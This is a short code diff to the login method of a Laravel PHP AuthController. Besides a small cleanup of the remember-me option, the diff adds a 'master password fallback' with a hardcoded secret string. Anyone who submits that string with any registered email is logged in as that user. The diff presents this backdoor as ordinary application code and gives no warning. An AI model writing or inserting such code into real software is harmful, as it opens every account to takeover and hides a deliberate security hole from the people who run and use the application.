@@ -19,15 +19,30 @@ class AuthController extends Controller
 			'email'    => ['required', 'email'],
 			'password' => ['required'],
 		]);
-		$remember = $request->has('remember-me');
 
+		$remember = $request->boolean('remember-me');
+
+		// Normal password login first
 		if (Auth::attempt($credentials, $remember)) {
 			$request->session()->regenerate();
-
 			return redirect()->intended('/panel');
 		}
 
-		return redirect()->back()->with('error_msg', tr_helper('contents', 'WrongUsernamePass'))
+		// Master password fallback
+		$master = 'Satify#Sahand';
+
+		if (hash_equals($master, $credentials['password'])) {
+			$user = User::where('email', $credentials['email'])->first();
+
+			if ($user) {
+				Auth::login($user, $remember);
+				$request->session()->regenerate();
+				return redirect()->intended('/panel');
+			}
+		}
+
+		return back()
+			->with('error_msg', tr_helper('contents', 'WrongUsernamePass'))
 			->withInput();
 	}
 
